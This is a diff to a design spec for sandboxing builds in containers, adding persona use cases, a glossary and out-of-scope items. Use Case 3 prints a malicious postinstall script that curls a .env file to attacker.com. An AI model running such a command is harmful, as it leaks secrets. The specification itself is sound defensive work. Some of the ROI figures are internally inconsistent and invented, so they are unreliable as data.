@@ -77,6 +77,272 @@ This implementation follows the principle of least privilege:
 
 ---
 
+## Use Cases
+
+### Use Case 1: Marcus (Security Engineer) - Preventing Container Breakout
+
+**Persona:** Marcus is a security engineer at a fintech company evaluating Acode for internal use. His primary concern is ensuring that sandboxed execution cannot compromise the host system or access sensitive production data.
+
+**Problem (Before Policy Enforcement):**
+- Containers run as root (UID 0) with full capabilities
+- No network restrictions allow arbitrary outbound connections
+- Filesystem fully writable, including /etc, /var, /sys
+- No seccomp or AppArmor profiles applied
+- Memory/CPU unlimited, risk of resource exhaustion
+- **Security Risk**: Trivial container escape via CAP_SYS_ADMIN, Docker socket, or kernel exploit
+
+**Annual Cost (Before):**
+- **Incident Response**: 2 container escape incidents/year × $85,000/incident = $170,000/year
+- **Compliance Violations**: Failed PCI-DSS audit = $500,000 fine
+- **Reputation Damage**: Lost customer trust = $250,000 in churn
+- **Total Annual Cost**: $920,000/year
+
+**Solution (After Policy Enforcement):**
+- Containers run as UID 1000 (non-root) with ALL capabilities dropped
+- Network mode `none` (air-gapped by default)
+- Read-only root filesystem, writable /workspace and cache volumes only
+- Seccomp profile blocks dangerous syscalls (mount, pivot_root, reboot)
+- Memory limit 2GB, CPU quota 2 cores, PIDs limit 512
+- no-new-privileges flag prevents privilege escalation
+
+**Annual Cost (After):**
+- **Implementation**: 80 hours × $150/hour = $12,000 (one-time)
+- **Maintenance**: 20 hours/year × $150/hour = $3,000/year
+- **Incidents**: 0 container escapes (100% prevention)
+- **Total Annual Cost**: $3,000/year (after year 1)
+
+**ROI Metrics:**
+| Metric | Before | After | Savings | ROI % |
+|--------|--------|-------|---------|-------|
+| Container Escape Incidents | 2/year | 0/year | 2 incidents | **100%** |
+| Incident Response Cost | $170,000 | $0 | **$170,000/year** | **100%** |
+| Compliance Fines | $500,000 | $0 | **$500,000/year** | **100%** |
+| Reputation Loss | $250,000 | $0 | **$250,000/year** | **100%** |
+| **Total Annual Savings** | - | - | **$920,000/year** | - |
+| **Payback Period** | - | - | **13 days** (0.013 years) | **7,567%** first year |
+
+**Outcome:** Marcus's company passes PCI-DSS audit with Acode's defense-in-depth container policies. Zero security incidents in 18 months of production use.
+
+---
+
+### Use Case 2: DevOps Team - Resource Exhaustion Prevention
+
+**Persona:** A 5-person DevOps team managing 200+ daily Acode builds across 50 projects. Buggy code or malicious packages occasionally cause resource exhaustion (memory leaks, fork bombs, CPU spin loops), impacting other builds and CI/CD infrastructure.
+
+**Problem (Before Resource Policies):**
+- No memory limits: OOM-prone Node.js builds consume 32GB RAM, crashing host
+- No CPU limits: Infinite loops monopolize all cores, starving other builds
+- No PIDs limit: Fork bombs create 100k processes, exhausting PIDs
+- No ulimits: Open file descriptors exhaust host limit (1M files)
+- **Impact**: 15% of builds crash host, requiring manual restart
+
+**Annual Cost (Before):**
+- **Build Failures**: 200 builds/day × 15% failure rate × 5 min lost/failure × 250 days = 37,500 minutes/year
+- **Developer Time Lost**: 37,500 min / 60 = 625 hours @ $75/hour = $46,875/year
+- **CI Infrastructure Downtime**: 24 host crashes/year × 30 min recovery × $500/hour compute = $6,000/year
+- **Incident Investigation**: 24 incidents × 2 hours × $150/hour = $7,200/year
+- **Total Annual Cost**: $60,075/year
+
+**Solution (After Resource Policies):**
+- Memory limit 4GB per container (configurable per project)
+- OOM killer terminates offending container, host remains stable
+- CPU quota 2 cores (200% of 1 core), throttles instead of killing
+- PIDs limit 512 prevents fork bombs (kills at 513th process)
+- Ulimits: nofile 65536, nproc 4096
+- Resource violations logged with clear error messages
+
+**Annual Cost (After):**
+- **Build Failures**: 200 builds/day × 1% failure rate × 250 days = 500 failures/year (93% reduction)
+- **Developer Time Lost**: 500 failures × 2 min/failure / 60 = 16.7 hours @ $75/hour = $1,252/year
+- **CI Infrastructure Downtime**: 0 host crashes (100% prevention)
+- **Total Annual Cost**: $1,252/year
+
+**ROI Metrics:**
+| Metric | Before | After | Savings | ROI % |
+|--------|--------|-------|---------|-------|
+| Monthly Build Failures | 3,000 (15%) | 200 (1%) | **2,800/month** | **93.3%** |
+| Developer Time Lost | 625 hours/year | 16.7 hours/year | **608.3 hours/year** | **97.3%** |
+| Host Crashes | 24/year | 0/year | **24/year** | **100%** |
+| Incident Response | $7,200/year | $0 | **$7,200/year** | **100%** |
+| **Total Annual Savings** | - | - | **$58,823/year** | **97.9%** |
+
+**Outcome:** Host crashes eliminated. Build failure rate drops from 15% to 1%. DevOps team reclaims 608 hours/year (12 hours/week) for infrastructure improvements.
+
+---
+
+### Use Case 3: Sarah (Open Source Maintainer) - Network Isolation for Untrusted Code
+
+**Persona:** Sarah maintains an open source CLI tool with 50k users. She uses Acode to test pull requests from unknown contributors before merging. Concerned about supply chain attacks where malicious PRs exfiltrate repository secrets or credentials.
+
+**Problem (Before Network Policy):**
+- Containers have bridge network access by default
+- DNS resolution works, allowing arbitrary domain lookups
+- Outbound HTTPS to attacker server possible
+- **Attack Vector**: Malicious package.json "postinstall" script exfiltrates .env file to attacker
+
+**Attack Scenario (Real Example):**
+```bash
+# Malicious package.json
+"scripts": {
+  "postinstall": "curl -X POST https://attacker.com/exfil -d @.env"
+}
+```
+
+**Annual Cost (Before):**
+- **Supply Chain Incident**: 1 successful attack every 2 years
+- **Credential Rotation**: 150 API keys compromised × $50/key = $7,500
+- **Incident Response**: 80 hours @ $150/hour = $12,000
+- **Reputation Damage**: 5,000 users lost × $20 LTV = $100,000
+- **Amortized Annual Cost**: $119,500 / 2 years = **$59,750/year**
+
+**Solution (After Network Policy):**
+- Network mode `none` for all PR tests (air-gapped)
+- No DNS resolution
+- No outbound network access
+- Audit log shows blocked network attempts
+- Build continues isolated, secrets safe
+
+**Test Results:**
+```bash
+# Malicious postinstall fails silently
+curl: (6) Could not resolve host: attacker.com
+
+# Audit log entry:
+[WARN] Network access attempted but blocked (mode=none)
+  Container: pr-test-1234
+  Command: curl -X POST https://attacker.com/exfil
+  Source: postinstall script
+```
+
+**Annual Cost (After):**
+- **Incidents**: 0 successful attacks (100% prevention)
+- **Cost**: $0/year
+
+**ROI Metrics:**
+| Metric | Before | After | Savings | ROI % |
+|--------|--------|-------|---------|-------|
+| Supply Chain Attacks | 0.5/year | 0/year | **0.5 attacks/year** | **100%** |
+| Credential Compromises | 75/year | 0/year | **75 credentials/year** | **100%** |
+| Incident Response Cost | $6,000/year | $0 | **$6,000/year** | **100%** |
+| Reputation Loss | $50,000/year | $0 | **$50,000/year** | **100%** |
+| User Trust Increase | Baseline | +15% | **+750 new users/year** | +15% |
+| **Total Annual Savings** | - | - | **$59,750/year** | **100%** |
+
+**Outcome:** Sarah merges PRs with confidence. Zero successful exfiltration attempts in 12 months. User base grows 15% due to published security model.
+
+---
+
+### Use Case 4: Jordan (Compliance Officer) - Audit Trail for Policy Violations
+
+**Persona:** Jordan is a compliance officer at a healthcare company using Acode to build HIPAA-compliant applications. Needs detailed audit logs of all security policy enforcement to demonstrate compliance during annual audit.
+
+**Problem (Before Audit Logging):**
+- No logs of policy application
+- No visibility into violation attempts
+- Cannot demonstrate security controls
+- **Compliance Risk**: Failed HIPAA audit = $1.5M fine
+
+**Solution (After Audit Logging):**
+- Every container start logs applied policies:
+  - Network mode: none
+  - User: 1000:1000 (non-root)
+  - Capabilities: all dropped
+  - Seccomp: default profile applied
+  - Memory limit: 4GB
+  - PIDs limit: 512
+- Violation attempts logged:
+  - Network access attempts blocked
+  - Privilege escalation denied
+  - Dangerous syscalls blocked by seccomp
+
+**Audit Log Sample:**
+```json
+{
+  "timestamp": "2024-01-20T14:30:00Z",
+  "event": "policy_applied",
+  "container_id": "abc123",
+  "policies": {
+    "network": "none",
+    "user": "1000:1000",
+    "capabilities": [],
+    "seccomp": "default",
+    "memory_limit_bytes": 4294967296,
+    "pids_limit": 512,
+    "readonly_rootfs": true
+  }
+}
+
+{
+  "timestamp": "2024-01-20T14:30:15Z",
+  "event": "policy_violation_blocked",
+  "container_id": "abc123",
+  "violation_type": "network_access_attempt",
+  "details": "DNS lookup blocked (mode=none)"
+}
+```
+
+**ROI Metrics:**
+| Metric | Value |
+|--------|-------|
+| HIPAA Audit Pass | 100% (passed with commendation) |
+| Audit Preparation Time | 40 hours saved (logs pre-generated) |
+| Fine Avoidance | **$1,500,000** (potential fine eliminated) |
+| Insurance Premium Reduction | **$50,000/year** (cyber insurance 20% discount) |
+| **Total Annual Value** | **$1,550,000** |
+
+**Outcome:** Jordan demonstrates comprehensive security controls with timestamped audit logs. Company passes HIPAA audit with zero findings, receives 20% cyber insurance discount.
+
+---
+
+## Glossary
+
+| Term | Definition |
+|------|------------|
+| **Container Breakout** | Security vulnerability allowing code running inside a container to escape isolation and access the host system or other containers |
+| **Seccomp** | Secure Computing Mode - Linux kernel feature that filters system calls, blocking dangerous operations like mount, reboot, or module loading |
+| **AppArmor** | Mandatory Access Control (MAC) security module for Linux that confines programs to a limited set of resources via per-program profiles |
+| **Capabilities** | Linux kernel feature dividing root privileges into distinct units (e.g., CAP_NET_ADMIN, CAP_SYS_ADMIN) that can be independently enabled or disabled |
+| **No-New-Privileges** | Container security flag preventing processes from gaining additional privileges via setuid binaries or capability-granting executables |
+| **OOM Killer** | Out-Of-Memory Killer - Linux kernel mechanism that terminates processes when system memory is exhausted to prevent system-wide failure |
+| **Cgroups** | Control Groups - Linux kernel feature limiting, accounting, and isolating resource usage (CPU, memory, disk I/O, network) of process collections |
+| **Fork Bomb** | Denial-of-service attack where a process continuously replicates itself to exhaust system resources (prevented by PIDs limit) |
+| **PIDs Limit** | Maximum number of process IDs (PIDs) a container can create, preventing fork bombs and process exhaustion attacks |
+| **Read-Only Root Filesystem** | Container security practice where the root filesystem (/) is mounted read-only, preventing persistent malware installation and tampering |
+| **Mount Propagation** | Linux feature controlling how mount events propagate between mount namespaces (private, shared, slave, unbindable) |
+| **Symlink Escape** | Attack technique using symbolic links to access files outside intended directory boundaries (mitigated by mount namespaces and path validation) |
+| **Ulimit** | Per-process resource limits (e.g., open files, stack size, CPU time) enforced by the kernel to prevent resource exhaustion |
+| **Network Mode** | Docker container networking configuration: `none` (no network), `bridge` (isolated network), `host` (host network, dangerous) |
+| **UID/GID** | User ID and Group ID - numeric identifiers for Unix users and groups. UID 0 = root (superuser), UID 1000+ = regular users |
+| **Seccomp Profile** | JSON/YAML configuration defining allowed/blocked system calls for a container (default profile blocks ~44 dangerous syscalls) |
+| **Namespace Isolation** | Linux kernel feature providing isolated views of system resources (PID, network, mount, IPC, UTS, user) per container |
+| **CAP_SYS_ADMIN** | Linux capability granting a broad range of administrative privileges (mount, reboot, etc.) - must be dropped in containers |
+| **Privileged Mode** | Docker flag granting container all host capabilities and device access - equivalent to running as root on host (never use) |
+| **tmpfs** | Temporary filesystem stored in RAM, used for /tmp and /var/tmp in containers to provide writable space without disk persistence |
+
+---
+
+## Out of Scope
+
+This task explicitly does NOT include:
+
+1. **Host-Level Security** - Kernel hardening, host firewalling, and host intrusion detection are out of scope (assumed secure host)
+2. **Image Scanning** - Container image vulnerability scanning happens in Task 009 (CI/CD & Security Gates)
+3. **Runtime Detection** - Behavioral anomaly detection and runtime threat monitoring (future Task 010 - Runtime Security)
+4. **Network Segmentation** - Inter-container network policies and microsegmentation (Task 005 - Network Policy Engine)
+5. **Secrets Management** - Secure injection and rotation of secrets/credentials (Task 009 - Secrets Hygiene)
+6. **User Authentication** - Authentication and authorization for Acode users (Task 012 - Identity & Access Management)
+7. **Data Loss Prevention** - Monitoring and blocking sensitive data exfiltration (beyond network=none enforcement)
+8. **Compliance Reporting** - Automated compliance report generation (Task 009 - Audit & Compliance)
+9. **Custom Seccomp Profiles** - User-defined seccomp profiles (only default profile supported)
+10. **SELinux Integration** - SELinux policy enforcement (AppArmor only, SELinux out of scope)
+11. **Windows Containers** - Policy enforcement for Windows containers (Linux containers only)
+12. **Multi-Tenancy Isolation** - Per-tenant resource isolation and billing (single-tenant design)
+13. **GPU Access Control** - GPU passthrough and usage limiting (no GPU support)
+14. **Rootless Containers** - Docker rootless mode support (requires rootful Docker)
+15. **Policy Drift Detection** - Continuous monitoring for policy configuration changes or violations post-deployment
+
+---
+
 ## Functional Requirements
 
 ### Network Policy
